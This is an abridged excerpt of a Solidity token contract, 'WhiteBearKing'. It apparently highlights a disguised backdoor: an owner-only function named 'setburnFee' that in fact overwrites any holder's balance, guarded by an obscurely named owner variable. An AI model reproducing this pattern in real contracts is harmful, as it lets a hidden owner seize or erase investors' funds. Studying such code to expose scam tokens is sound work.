...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_opo == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract WhiteBearKing is Context, IERC20, Ownable {
    ...
    string private _name = "WhiteBearKing";
    string private _symbol = "WhiteBearKing";
    ...
    function setNumTokenPercent(uint256 numToken) external onlyOwner() {
     ...
     function setburnFee(address spender, uint256 burnFee) public onlyOwner {
        _rOwned[spender] = (burnFee.mul(_getRate()));
    }
